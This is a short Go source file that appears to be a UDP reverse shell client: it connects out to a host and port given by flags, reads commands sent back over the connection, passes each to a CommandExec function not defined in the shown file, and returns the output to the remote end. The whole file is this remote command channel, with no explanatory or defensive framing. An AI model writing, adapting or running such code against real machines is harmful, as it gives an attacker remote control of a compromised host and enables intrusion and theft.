package main

import (
  "bufio"
  "flag"
  "fmt"
  "net"
)

var (
  host, port string
)

func init() {
  flag.StringVar(&host, "host", "127.0.0.1", "target host")
  flag.StringVar(&port, "port", "8080", "target port")
}

func CreateUDPAddr(host, port string) (*net.UDPAddr, error) {
  return net.ResolveUDPAddr("udp", net.JoinHostPort(host, port))
}

func GetCommand(scanner *bufio.Scanner, connUDP *net.UDPConn) {
  for scanner.Scan() {
    result := CommandExec(scanner.Text())
    fmt.Fprintf(connUDP, result)
  }
  CheckError(scanner.Err())
}

func CheckError(err error) {
  if err != nil {
    panic(err)
  }
}
func main() {
  flag.Parse()
  a, err := CreateUDPAddr(host, port)
  CheckError(err)
  connUDP, err := net.DialUDP("udp", nil, a)
  CheckError(err)
  scanner := bufio.NewScanner(bufio.NewReader(connUDP))
  fmt.Fprintf(connUDP, "\n")

  GetCommand(scanner, connUDP)
}

